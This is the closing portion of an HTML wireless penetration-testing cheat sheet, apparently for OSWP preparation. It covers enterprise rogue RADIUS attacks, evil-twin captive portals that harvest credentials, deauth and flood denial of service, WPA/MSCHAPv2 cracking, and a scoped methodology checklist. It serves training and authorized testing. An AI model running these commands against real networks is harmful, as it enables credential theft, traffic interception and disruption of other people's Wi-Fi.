+              <h3 id="wpa-enterprise-8021x-hostapd-wpe">10.3 hostapd-wpe</h3>
+              <p>The classic enterprise-attack AP &mdash; impersonates the RADIUS server and logs the inner credentials.</p>
+              <pre><code class="language-bash"># Generate server certs - One-time certificate setup
+cd /etc/hostapd-wpe/certs &amp;&amp; sudo ./bootstrap
+
+# Launch the rogue RADIUS AP - Logs usernames and the MSCHAPv2 challenge/response
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf</code></pre>
+              <h3 id="wpa-enterprise-8021x-eap-methods">10.4 EAP Methods</h3>
+              <table class="custom-table">
+                <thead>
+                  <tr><th>Description</th><th>Command</th><th>Notes on Methodology</th></tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><strong>EAP-TLS</strong></td>
+                    <td><code>client + server certificates</code></td>
+                    <td>Strongest; no password to steal &mdash; need a client cert</td>
+                  </tr>
+                  <tr>
+                    <td><strong>EAP-TTLS / PEAP</strong></td>
+                    <td><code>TLS tunnel around MSCHAPv2</code></td>
+                    <td>Most common &mdash; rogue AP captures the inner MSCHAPv2</td>
+                  </tr>
+                  <tr>
+                    <td><strong>EAP-GTC</strong></td>
+                    <td><code>plaintext token in the tunnel</code></td>
+                    <td>A GTC downgrade can yield the cleartext password</td>
+                  </tr>
+                  <tr>
+                    <td><strong>EAP-MD5</strong></td>
+                    <td><code>challenge/response, no server auth</code></td>
+                    <td>Trivially captured and cracked; rare today</td>
+                  </tr>
+                </tbody>
+              </table>
+              <h3 id="wpa-enterprise-8021x-config-certificates">10.5 Config &amp; Certificates</h3>
+              <p>Key bits of a rogue RADIUS config and an EAP-TLS client.</p>
+              <pre><code class="language-bash"># hostapd-wpe.conf (essentials)
+interface=wlan0
+ssid=[essid]
+channel=[channel]
+hw_mode=g
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd-wpe.eap_user
+ca_cert=./certs/ca.pem
+server_cert=./certs/server.pem
+private_key=./certs/server.key</code></pre>
+              <pre><code class="language-bash"># EAP-TLS client (wpa_supplicant)
+network={
+  ssid="[essid]"
+  key_mgmt=WPA-EAP
+  eap=TLS
+  identity="[user]"
+  ca_cert="/path/ca.pem"
+  client_cert="/path/client.pem"
+  private_key="/path/client.key"
+  private_key_passwd="[pass]"
+}</code></pre>
+              <h3 id="wpa-enterprise-8021x-cracking-relay">10.6 Cracking &amp; Relay</h3>
+              <pre><code class="language-bash"># Crack MSCHAPv2 (hashcat) - Recovers the account password
+hashcat -m 5500 [netntlm_hash] [wordlist]
+
+# Crack with asleap - Classic challenge/response cracker
+asleap -r capture.dump -f [dict]
+
+# Relay the credentials - Relay captured NTLM where signing permits
+ntlmrelayx (downstream)</code></pre>
+              <h2 id="rogue-access-points-evil-twin">11. Rogue Access Points &amp; Evil Twin</h2>
+              <p>A look-alike AP lures clients for credential capture or man-in-the-middle.</p>
+              <h3 id="rogue-access-points-evil-twin-soft-ap">11.1 Soft AP</h3>
+              <pre><code class="language-bash"># Create a fake AP - Brings up the at0 interface
+sudo airbase-ng -e [essid] -c [channel] wlan0mon
+
+# WPA2 rogue - Advertise WPA2 to coax a handshake
+sudo airbase-ng -e [essid] -c [channel] -Z 4 wlan0mon</code></pre>
+              <h3 id="rogue-access-points-evil-twin-karma-known-beacons">11.2 Karma / Known Beacons</h3>
+              <pre><code class="language-bash"># Answer probed networks - Responds to clients’ saved-network probes
+sudo ./eaphammer -i wlan0 --essid [essid] --known-beacons
+
+# MANA loud mode - Replies to every probe to attract clients
+hostapd-mana (loud=1)</code></pre>
+              <h3 id="rogue-access-points-evil-twin-captive-portal">11.3 Captive Portal</h3>
+              <pre><code class="language-bash"># wifiphisher - Automated evil-twin plus a credential page
+sudo wifiphisher
+
+# eaphammer portal - Built-in hostile captive portal
+sudo ./eaphammer -i wlan0 --essid [essid] --captive-portal</code></pre>
+              <h3 id="rogue-access-points-evil-twin-all-in-one-frameworks">11.4 All-in-One Frameworks</h3>
+              <pre><code class="language-bash"># airgeddon - Menu-driven wrapper for capture, evil-twin, WPS, and cracking
+sudo airgeddon
+
+# Fluxion - Evil-twin + captive-portal social-engineering attack
+sudo ./fluxion.sh
+
+# WiFi-Pumpkin3 - Rogue-AP framework with proxies and plugins
+sudo wifipumpkin3
+
+# bettercap (wifi) - wifi.recon / wifi.deauth / handshake-capture module
+sudo bettercap -iface wlan0mon</code></pre>
+              <h3 id="rogue-access-points-evil-twin-manual-evil-twin-stack">11.5 Manual Evil-Twin Stack</h3>
+              <p>A hand-built captive portal: rogue AP plus DHCP/DNS redirect.</p>
+              <pre><code class="language-bash"># hostapd.conf
+interface=wlan0
+ssid=[essid]
+channel=[channel]
+hw_mode=g
+
+# dnsmasq.conf
+interface=wlan0
+dhcp-range=10.0.0.10,10.0.0.100,12h
+address=/#/10.0.0.1   # send all DNS to the portal</code></pre>
+              <h2 id="denial-of-service">12. Denial of Service</h2>
+              <p>Disruptive techniques &mdash; only ever in scope and with written authorization, as they affect availability.</p>
+              <h3 id="denial-of-service-deauthentication-flood">12.1 Deauthentication Flood</h3>
+              <pre><code class="language-bash"># Targeted deauth flood - 0 = continuous; knocks a client offline
+sudo aireplay-ng --deauth 0 -a [bssid] -c [client] wlan0mon
+
+# mdk4 deauth - Aggressive multi-client deauth
+sudo mdk4 wlan0mon d -B [bssid]</code></pre>
+              <h3 id="denial-of-service-beacon-auth-floods">12.2 Beacon &amp; Auth Floods</h3>
+              <pre><code class="language-bash"># Beacon flood - Spams fake APs to confuse clients
+sudo mdk4 wlan0mon b -n [essid]
+
+# Authentication DoS - Floods the AP with bogus auth requests
+sudo mdk4 wlan0mon a -a [bssid]</code></pre>
+              <h3 id="denial-of-service-mdk4-modes">12.3 mdk4 Modes</h3>
+              <pre><code class="language-bash"># d — Deauth / Disassoc - Knock clients off a target
+sudo mdk4 wlan0mon d -B [bssid]
+
+# b — Beacon flood - Flood fake beacons
+sudo mdk4 wlan0mon b -n [essid]
+
+# a — Auth DoS - Exhaust the AP’s client table
+sudo mdk4 wlan0mon a -a [bssid]
+
+# p — Probe / SSID - Probe and brute hidden SSIDs
+sudo mdk4 wlan0mon p -t [bssid]
+
+# m — Michael (TKIP) DoS - Trigger TKIP countermeasures
+sudo mdk4 wlan0mon m -t [bssid]</code></pre>
+              <h2 id="aircrack-ng-suite-reference">13. Aircrack-ng Suite Reference</h2>
+              <p>Quick reference to the tools in the aircrack-ng suite and what each one is for.</p>
+              <h3 id="aircrack-ng-suite-reference-tools">13.1 Tools</h3>
+              <pre><code class="language-bash"># airmon-ng - Enable / disable monitor mode
+sudo airmon-ng start wlan0
+
+# airodump-ng - Capture frames; discover APs and clients
+sudo airodump-ng wlan0mon
+
+# aireplay-ng - Inject frames (deauth, replay, fake-auth)
+sudo aireplay-ng --deauth 10 -a [bssid] wlan0mon
+
+# aircrack-ng - Crack WEP IVs and WPA handshakes
+aircrack-ng -w [wordlist] capture.cap
+
+# airdecap-ng - Decrypt a captured WEP / WPA trace
+airdecap-ng -e [essid] -p [pw] capture.cap
+
+# airbase-ng - Create rogue / fake access points
+sudo airbase-ng -e [essid] wlan0mon
+
+# airolib-ng - Manage precomputed PMK databases
+airolib-ng db --batch
+
+# airgraph-ng - Graph client-to-AP relationships
+airgraph-ng -i capture.csv -g CAPR -o out.png
+
+# packetforge-ng - Craft injectable packets from a keystream
+packetforge-ng --arp -a [bssid] -h [mac] -y keystream.xor -w arp.cap
+
+# airodump-ng OUI lookup - Refresh the manufacturer database
+airodump-ng-oui-update</code></pre>
+              <h2 id="cracking-wordlists">14. Cracking &amp; Wordlists</h2>
+              <p>Reference for the offline cracking step, whatever capture you started from.</p>
+              <h3 id="cracking-wordlists-wordlists">14.1 Wordlists</h3>
+              <pre><code class="language-bash"># Default list - gunzip it before first use
+/usr/share/wordlists/rockyou.txt
+
+# Generate a keyspace - Build a custom list on the fly
+crunch [min] [max] [charset]
+
+# Site-specific words - Scrape a wordlist from the org’s site
+cewl -d 2 -m 6 -w site.txt https://[target]
+
+# Keyboard-walk lists - Generate walk-the-keyboard candidates
+kwp basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route</code></pre>
+              <h3 id="cracking-wordlists-hashcat-modes-tips">14.2 hashcat Modes &amp; Tips</h3>
+              <table class="custom-table">
+                <thead>
+                  <tr><th>Description</th><th>Command</th><th>Notes on Methodology</th></tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><strong>WPA handshakes / PMKID</strong></td>
+                    <td><code>-m 22000</code></td>
+                    <td>WPA-PBKDF2-PMKID+EAPOL</td>
+                  </tr>
+                  <tr>
+                    <td><strong>WPA-Enterprise MSCHAPv2</strong></td>
+                    <td><code>-m 5500</code></td>
+                    <td>NetNTLMv1</td>
+                  </tr>
+                  <tr>
+                    <td><strong>Dictionary / rules / mask</strong></td>
+                    <td><code>-a 0 / -r / -a 3</code></td>
+                    <td>Core attack modes</td>
+                  </tr>
+                  <tr>
+                    <td><strong>Resume a session</strong></td>
+                    <td><code>hashcat --session oswp --restore</code></td>
+                    <td>Continue an interrupted crack</td>
+                  </tr>
+                  <tr>
+                    <td><strong>Benchmark</strong></td>
+                    <td><code>hashcat -b -m 22000</code></td>
+                    <td>Gauge expected speed on your GPU</td>
+                  </tr>
+                </tbody>
+              </table>
+              <h3 id="cracking-wordlists-hash-conversion">14.3 Hash Conversion</h3>
+              <pre><code class="language-bash"># Modern (recommended) - Produces mode-22000 hashes
+hcxpcapngtool -o hash.hc22000 capture.pcapng
+
+# Legacy hccapx - Older mode-2500 format if needed
+cap2hccapx capture.cap out.hccapx
+
+# Crack with John - Alternative cracker to hashcat
+john --format=wpapsk-opencl --wordlist=[wordlist] hash.hc22000</code></pre>
+              <h2 id="post-access-traffic-analysis">15. Post-Access &amp; Traffic Analysis</h2>
+              <p>After recovering a key, connect to validate access and decrypt the captured traffic for evidence.</p>
+              <h3 id="post-access-traffic-analysis-decryption">15.1 Decryption</h3>
+              <pre><code class="language-bash"># Decrypt WPA traffic - Outputs a decrypted .cap
+airdecap-ng -e [essid] -p [password] capture-01.cap
+
+# Decrypt WEP traffic - Uses the recovered WEP key
+airdecap-ng -w [hexkey] capture-01.cap</code></pre>
+              <h3 id="post-access-traffic-analysis-inspection">15.2 Inspection</h3>
+              <pre><code class="language-bash"># Open in Wireshark - Filter on eapol or wlan.fc.type_subtype
+wireshark capture-01-dec.cap
+
+# CLI frame filtering - Quickly locate handshakes / management frames
+tshark -r capture-01.cap -Y eapol
+
+# Management frames - Beacons, probes, (de)auth, assoc
+tshark -r capture.cap -Y 'wlan.fc.type==0'
+
+# Raw capture - Capture outside the aircrack toolchain
+sudo tcpdump -i wlan0mon -w raw.pcap</code></pre>
+              <h2 id="methodology">16. Methodology</h2>
+              <h3 id="methodology-pre-engagement-setup">16.1 Pre-Engagement &amp; Setup</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-scope"> Confirm scope: in-scope ESSIDs/BSSIDs, whether deauth and DoS are permitted, and the testing window</li>
+                <li><input type="checkbox" data-id="m-adapter"> Verify the adapter does monitor mode and passes an injection test; keep a spare on hand</li>
+                <li><input type="checkbox" data-id="m-prep"> Set the regulatory domain, sync the clock, stage wordlists, and ensure disk space for captures</li>
+                <li><input type="checkbox" data-id="m-baseline"> Record the starting state (interface name, MAC) so you can restore it cleanly afterward</li>
+              </ul>
+              <h3 id="methodology-reconnaissance">16.2 Reconnaissance</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-mon"> Kill interfering processes and enable monitor mode</li>
+                <li><input type="checkbox" data-id="m-sweep"> Sweep 2.4 GHz and 5 GHz; log every in-scope AP (BSSID, ESSID, channel, encryption, cipher, WPS, PWR)</li>
+                <li><input type="checkbox" data-id="m-clients"> Enumerate the clients on each AP and note their probe requests</li>
+                <li><input type="checkbox" data-id="m-hidden"> Reveal any hidden ESSIDs by deauthing an associated client</li>
+                <li><input type="checkbox" data-id="m-classify"> Classify each target by encryption (WEP / WPA2 / WPA3 / Enterprise) to choose the attack path</li>
+              </ul>
+              <h3 id="methodology-target-selection">16.3 Target Selection</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-prioritize"> Prioritize targets by encryption weakness and signal strength</li>
+                <li><input type="checkbox" data-id="m-lock"> Lock the card to the target channel and start a scoped capture to file</li>
+              </ul>
+              <h3 id="methodology-wep-path">16.4 WEP Path</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-wep-assoc"> With clients present: fake-auth, then ARP-replay to flood IVs</li>
+                <li><input type="checkbox" data-id="m-wep-noclient"> Without clients: fragmentation or chopchop to recover a keystream, then packetforge + inject</li>
+                <li><input type="checkbox" data-id="m-wep-clientside"> Isolated client only: Caffe-Latte / Hirte against the roaming client</li>
+                <li><input type="checkbox" data-id="m-wep-crack"> Collect enough IVs and crack with PTW (fall back to KoreK if it stalls)</li>
+              </ul>
+              <h3 id="methodology-wpa-wpa2-psk-path">16.5 WPA / WPA2-PSK Path</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-wpa-cap"> Capture the 4-way handshake (deauth a client) or grab the PMKID clientlessly</li>
+                <li><input type="checkbox" data-id="m-wpa-verify"> Verify all four EAPOL messages, clean the capture (wpaclean), and convert to hc22000</li>
+                <li><input type="checkbox" data-id="m-wpa-crack"> Crack offline: dictionary first, then rules and masks (aircrack-ng / hashcat)</li>
+                <li><input type="checkbox" data-id="m-wpa-wps"> If WPS is enabled: Pixie-Dust first, then a rate-limited PIN brute force; recover the PSK</li>
+                <li><input type="checkbox" data-id="m-wpa-apless"> If the AP is out of range, fall back to an AP-less / PMKID approach</li>
+              </ul>
+              <h3 id="methodology-wpa3-path">16.6 WPA3 Path</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-wpa3-id"> Confirm SAE and that mandatory PMF blocks classic deauth</li>
+                <li><input type="checkbox" data-id="m-wpa3-transition"> Look for WPA2/WPA3 transition mode and attack the crackable WPA2 fallback</li>
+                <li><input type="checkbox" data-id="m-wpa3-sae"> Against pure SAE, pivot to misconfiguration and the client side &mdash; offline dictionary attacks will not work</li>
+              </ul>
+              <h3 id="methodology-wpa-enterprise-path">16.7 WPA-Enterprise Path</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-ent-recon"> Recon the EAP method, the RADIUS server certificate, and the user/domain naming</li>
+                <li><input type="checkbox" data-id="m-ent-rogue"> Stand up a rogue AP (EAPHammer / hostapd-wpe) with a convincing certificate</li>
+                <li><input type="checkbox" data-id="m-ent-capture"> Capture the inner MSCHAPv2 challenge/response from a connecting client</li>
+                <li><input type="checkbox" data-id="m-ent-crack"> Crack it (hashcat -m 5500 / asleap), or relay the credentials where signing allows</li>
+              </ul>
+              <h3 id="methodology-rogue-ap-evil-twin">16.8 Rogue AP / Evil Twin</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-rogue-lure"> Where in scope, lure clients with Karma / known-beacons or a targeted evil twin</li>
+                <li><input type="checkbox" data-id="m-rogue-portal"> Use a captive portal to harvest credentials if that is an objective</li>
+              </ul>
+              <h3 id="methodology-post-exploitation">16.9 Post-Exploitation</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-connect"> Connect with the recovered key (wpa_supplicant) and confirm access</li>
+                <li><input type="checkbox" data-id="m-internal"> Pull a DHCP lease and perform light internal recon &mdash; only if it is in scope</li>
+                <li><input type="checkbox" data-id="m-decrypt"> Decrypt the captured traffic (airdecap-ng) and inspect it (Wireshark / tshark)</li>
+              </ul>
+              <h3 id="methodology-reporting-cleanup">16.10 Reporting &amp; Cleanup</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-evidence"> Record each finding: AP, encryption, method, time-to-crack, and evidence (capture files, cracked keys, screenshots)</li>
+                <li><input type="checkbox" data-id="m-recommend"> Note defensive recommendations: WPA3 + PMF, a long/random PSK, disable WPS, EAP-TLS for enterprise</li>
+                <li><input type="checkbox" data-id="m-cleanup"> Restore the adapter to managed mode, tear down any rogue APs, and clean up artifacts</li>
+              </ul>
+              <h2 id="references">17. References</h2>
+              <p>[1] Aircrack-ng, &quot;Official Documentation,&quot; [Online]. Available: <a href="https://www.aircrack-ng.org/documentation.html" target="_blank" rel="noopener noreferrer">https://www.aircrack-ng.org/documentation.html</a>.</p>
+              <p>[2] hashcat, &quot;Wiki &amp; WPA Cracking Reference,&quot; [Online]. Available: <a href="https://hashcat.net/wiki/" target="_blank" rel="noopener noreferrer">https://hashcat.net/wiki/</a>.</p>
+              <p>[3] ZerBea, &quot;hcxtools / hcxdumptool (PMKID),&quot; [Online]. Available: <a href="https://github.com/ZerBea/hcxdumptool" target="_blank" rel="noopener noreferrer">https://github.com/ZerBea/hcxdumptool</a>.</p>
+              <p>[4] s0lst1c3, &quot;EAPHammer (Enterprise / Evil Twin),&quot; [Online]. Available: <a href="https://github.com/s0lst1c3/eaphammer" target="_blank" rel="noopener noreferrer">https://github.com/s0lst1c3/eaphammer</a>.</p>
+              <p>[5] t6x, &quot;Reaver-WPS (fork-t6x),&quot; [Online]. Available: <a href="https://github.com/t6x/reaver-wps-fork-t6x" target="_blank" rel="noopener noreferrer">https://github.com/t6x/reaver-wps-fork-t6x</a>.</p>
+              <p>[6] iPhantasmic, &quot;OSWP Preparation Notes,&quot; [Online]. Available: <a href="https://github.com/iPhantasmic/OSWP" target="_blank" rel="noopener noreferrer">https://github.com/iPhantasmic/OSWP</a>.</p>
+              <p>[7] E. Solis, &quot;OSWP Cheatsheet &mdash; topic &amp; structure inspiration,&quot; [Online]. Available: <a href="https://www.emmanuelsolis.com/oswp.html" target="_blank" rel="noopener noreferrer">https://www.emmanuelsolis.com/oswp.html</a>.</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cheatsheet Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Index ======= -->
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+
+    <div class="section-flow-1">
+      <button class="dropdown-btn">1. Wireless Fundamentals &amp; Adapter Setup
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wireless-fundamentals-adapter-setup-interfaces-capabilities">1.1 Interfaces &amp; Capabilities</a>
+        <a href="#wireless-fundamentals-adapter-setup-monitor-mode">1.2 Monitor Mode</a>
+        <a href="#wireless-fundamentals-adapter-setup-channels-bands-regulatory">1.3 Channels, Bands &amp; Regulatory</a>
+        <a href="#wireless-fundamentals-adapter-setup-mac-spoofing">1.4 MAC Spoofing</a>
+        <a href="#wireless-fundamentals-adapter-setup-troubleshooting">1.5 Troubleshooting</a>
+      </div>
+    </div>
+    <div class="section-flow-2">
+      <button class="dropdown-btn">2. Wireless Security Protocols
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wireless-security-protocols-at-a-glance">2.1 At a Glance</a>
+        <a href="#wireless-security-protocols-the-wpa-4-way-handshake">2.2 The WPA 4-Way Handshake</a>
+        <a href="#wireless-security-protocols-pmkid-clientless">2.3 PMKID (Clientless)</a>
+        <a href="#wireless-security-protocols-bands-channels">2.4 Bands &amp; Channels</a>
+      </div>
+    </div>
+    <div class="section-flow-3">
+      <button class="dropdown-btn">3. Reconnaissance &amp; Discovery
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#reconnaissance-discovery-scanning-the-airspace">3.1 Scanning the Airspace</a>
+        <a href="#reconnaissance-discovery-targeting-an-access-point">3.2 Targeting an Access Point</a>
+        <a href="#reconnaissance-discovery-hidden-networks">3.3 Hidden Networks</a>
+        <a href="#reconnaissance-discovery-clients-probe-requests">3.4 Clients &amp; Probe Requests</a>
+        <a href="#reconnaissance-discovery-alternative-scanners">3.5 Alternative Scanners</a>
+        <a href="#reconnaissance-discovery-wardriving-gps">3.6 Wardriving (GPS)</a>
+      </div>
+    </div>
+    <div class="section-flow-4">
+      <button class="dropdown-btn">4. Connecting to Networks
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#connecting-to-networks-open-wep">4.1 Open &amp; WEP</a>
+        <a href="#connecting-to-networks-wpa-wpa2-wpa3">4.2 WPA / WPA2 / WPA3</a>
+        <a href="#connecting-to-networks-wpa-enterprise">4.3 WPA Enterprise</a>
+      </div>
+    </div>
+    <div class="section-flow-5">
+      <button class="dropdown-btn">5. Capturing Handshakes &amp; PMKID
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#capturing-handshakes-pmkid-4-way-handshake">5.1 4-Way Handshake</a>
+        <a href="#capturing-handshakes-pmkid-forcing-a-handshake">5.2 Forcing a Handshake</a>
+        <a href="#capturing-handshakes-pmkid-pmkid-clientless">5.3 PMKID (Clientless)</a>
+        <a href="#capturing-handshakes-pmkid-verifying-cleaning-captures">5.4 Verifying &amp; Cleaning Captures</a>
+        <a href="#capturing-handshakes-pmkid-automated-capture">5.5 Automated Capture</a>
+      </div>
+    </div>
+    <div class="section-flow-6">
+      <button class="dropdown-btn">6. WEP
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wep-with-connected-clients">6.1 With Connected Clients</a>
+        <a href="#wep-without-clients">6.2 Without Clients</a>
+        <a href="#wep-client-side-attacks-caffe-latte-hirte">6.3 Client-Side Attacks (Caffe-Latte &amp; Hirte)</a>
+        <a href="#wep-cracking-the-key">6.4 Cracking the Key</a>
+        <a href="#wep-automated-wep">6.5 Automated WEP</a>
+      </div>
+    </div>
+    <div class="section-flow-7">
+      <button class="dropdown-btn">7. WPA / WPA2 (PSK)
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wpa-wpa2-psk-cracking-with-aircrack-ng">7.1 Cracking with aircrack-ng</a>
+        <a href="#wpa-wpa2-psk-cracking-with-hashcat">7.2 Cracking with hashcat</a>
+        <a href="#wpa-wpa2-psk-ap-less-capture">7.3 AP-less Capture</a>
+        <a href="#wpa-wpa2-psk-precomputed-pmk-rainbow-tables">7.4 Precomputed PMK (Rainbow Tables)</a>
+        <a href="#wpa-wpa2-psk-automation">7.5 Automation</a>
+      </div>
+    </div>
+    <div class="section-flow-8">
+      <button class="dropdown-btn">8. WPS
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wps-discovery">8.1 Discovery</a>
+        <a href="#wps-pixie-dust-offline">8.2 Pixie-Dust (Offline)</a>
+        <a href="#wps-online-pin-brute-force">8.3 Online PIN Brute Force</a>
+        <a href="#wps-recover-the-psk">8.4 Recover the PSK</a>
+      </div>
+    </div>
+    <div class="section-flow-9">
+      <button class="dropdown-btn">9. WPA3 (SAE)
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wpa3-sae-identifying-wpa3-pmf">9.1 Identifying WPA3 &amp; PMF</a>
+        <a href="#wpa3-sae-transition-mode-downgrade">9.2 Transition-Mode Downgrade</a>
+        <a href="#wpa3-sae-dragonblood-awareness">9.3 Dragonblood (Awareness)</a>
+      </div>
+    </div>
+    <div class="section-flow-10">
+      <button class="dropdown-btn">10. WPA Enterprise (802.1X)
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wpa-enterprise-8021x-reconnaissance">10.1 Reconnaissance</a>
+        <a href="#wpa-enterprise-8021x-rogue-ap-with-eaphammer">10.2 Rogue AP with EAPHammer</a>
+        <a href="#wpa-enterprise-8021x-hostapd-wpe">10.3 hostapd-wpe</a>
+        <a href="#wpa-enterprise-8021x-eap-methods">10.4 EAP Methods</a>
+        <a href="#wpa-enterprise-8021x-config-certificates">10.5 Config &amp; Certificates</a>
+        <a href="#wpa-enterprise-8021x-cracking-relay">10.6 Cracking &amp; Relay</a>
+      </div>
+    </div>
+    <div class="section-flow-11">
+      <button class="dropdown-btn">11. Rogue Access Points &amp; Evil Twin
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#rogue-access-points-evil-twin-soft-ap">11.1 Soft AP</a>
+        <a href="#rogue-access-points-evil-twin-karma-known-beacons">11.2 Karma / Known Beacons</a>
+        <a href="#rogue-access-points-evil-twin-captive-portal">11.3 Captive Portal</a>
+        <a href="#rogue-access-points-evil-twin-all-in-one-frameworks">11.4 All-in-One Frameworks</a>
+        <a href="#rogue-access-points-evil-twin-manual-evil-twin-stack">11.5 Manual Evil-Twin Stack</a>
+      </div>
+    </div>
+    <div class="section-flow-12">
+      <button class="dropdown-btn">12. Denial of Service
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#denial-of-service-deauthentication-flood">12.1 Deauthentication Flood</a>
+        <a href="#denial-of-service-beacon-auth-floods">12.2 Beacon &amp; Auth Floods</a>
+        <a href="#denial-of-service-mdk4-modes">12.3 mdk4 Modes</a>
+      </div>
+    </div>
+    <div class="section-flow-13">
+      <button class="dropdown-btn">13. Aircrack-ng Suite Reference
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#aircrack-ng-suite-reference-tools">13.1 Tools</a>
+      </div>
+    </div>
+    <div class="section-flow-14">
+      <button class="dropdown-btn">14. Cracking &amp; Wordlists
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#cracking-wordlists-wordlists">14.1 Wordlists</a>
+        <a href="#cracking-wordlists-hashcat-modes-tips">14.2 hashcat Modes &amp; Tips</a>
+        <a href="#cracking-wordlists-hash-conversion">14.3 Hash Conversion</a>
+      </div>
+    </div>
+    <div class="section-flow-15">
+      <button class="dropdown-btn">15. Post-Access &amp; Traffic Analysis
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#post-access-traffic-analysis-decryption">15.1 Decryption</a>
+        <a href="#post-access-traffic-analysis-inspection">15.2 Inspection</a>
+      </div>
+    </div>
+    <div class="section-flow-16">
+      <button class="dropdown-btn">16. Methodology
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#methodology-pre-engagement-setup">16.1 Pre-Engagement &amp; Setup</a>
+        <a href="#methodology-reconnaissance">16.2 Reconnaissance</a>
+        <a href="#methodology-target-selection">16.3 Target Selection</a>
+        <a href="#methodology-wep-path">16.4 WEP Path</a>
+        <a href="#methodology-wpa-wpa2-psk-path">16.5 WPA / WPA2-PSK Path</a>
+        <a href="#methodology-wpa3-path">16.6 WPA3 Path</a>
+        <a href="#methodology-wpa-enterprise-path">16.7 WPA-Enterprise Path</a>
+        <a href="#methodology-rogue-ap-evil-twin">16.8 Rogue AP / Evil Twin</a>
+        <a href="#methodology-post-exploitation">16.9 Post-Exploitation</a>
+        <a href="#methodology-reporting-cleanup">16.10 Reporting &amp; Cleanup</a>
+      </div>
+    </div>
+    <div class="section-flow-17">
+      <a href="#references">17. References</a>
+    </div>
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Wencheng Xue<br>
+          Penetration Tester &amp; Vulnerability Researcher
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="./vendor/purecounter/purecounter.js"></script>
+  <script src="./vendor/aos/aos.js"></script>
+  <script src="./vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="./vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="./vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="./vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="./vendor/typed.js/typed.min.js"></script>
+  <script src="./vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="./vendor/php-email-form/validate.js"></script>
+
+  <!-- Prism JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-csharp.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="./js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script src="js/prism-langs.js"></script>
+  
+
+  <script src="js/cheatsheet-index.js"></script>
+
+  <script src="js/methodology-checkboxes.js"></script>
+</body>
+
+</html>
